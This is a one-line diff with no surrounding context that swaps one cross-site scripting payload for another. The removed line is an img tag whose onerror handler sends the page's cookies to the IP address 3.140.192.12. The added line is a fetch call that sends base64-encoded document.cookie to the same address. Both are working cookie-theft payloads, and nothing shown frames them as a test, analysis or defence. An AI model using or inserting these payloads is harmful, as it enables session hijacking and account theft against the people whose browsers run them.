@@ -1,1 +1,1 @@
-<img src=x onerror="this.src='http://3.140.192.12/?'+document.cookie; this.removeAttribute('onerror');">
+fetch('http://3.140.192.12/?c='+btoa(document.cookie));
